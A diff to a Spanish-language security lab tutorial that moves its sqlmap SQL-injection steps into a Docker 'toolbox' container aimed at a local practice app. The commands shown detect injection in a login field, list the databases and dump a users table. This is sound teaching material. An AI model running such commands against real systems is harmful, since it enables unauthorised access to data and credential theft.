@@ -1,11 +1,11 @@
 # Paso 4 — Explotación automatizada con sqlmap
 
-Encontrar el payload a mano funciona, pero en una aplicación real con muchos parámetros no es práctico probar variante por variante. `sqlmap` automatiza tanto la detección como la explotación.
+Encontrar el payload a mano funciona, pero en una aplicación real con muchos parámetros no es práctico probar variante por variante. `sqlmap` automatiza tanto la detección como la explotación. Igual que `nmap`/`hydra` en la práctica anterior, `sqlmap` vive en el contenedor `toolbox`, apuntando a `app:8888` por nombre de servicio.
 
 ## 4.1 — Detectar la inyección
 
 ```bash
-sqlmap -u "http://127.0.0.1:8888/login" \
+docker compose exec toolbox sqlmap -u "http://app:8888/login" \
   --data="usuario=admin&password=test" \
   -p usuario --batch
 ```
@@ -21,7 +21,7 @@ Te va a preguntar varias cosas por consola (seguir con los redirects, extender l
 ## 4.2 — Listar las bases de datos
 
 ```bash
-sqlmap -u "http://127.0.0.1:8888/login" \
+docker compose exec toolbox sqlmap -u "http://app:8888/login" \
   --data="usuario=admin&password=test" \
   -p usuario --batch --dbs
 ```
@@ -29,7 +29,7 @@ sqlmap -u "http://127.0.0.1:8888/login" \
 ## 4.3 — Volcar la tabla de usuarios
 
 ```bash
-sqlmap -u "http://127.0.0.1:8888/login" \
+docker compose exec toolbox sqlmap -u "http://app:8888/login" \
   --data="usuario=admin&password=test" \
   -p usuario --batch \
   --dump -D alumnos -T usuarios
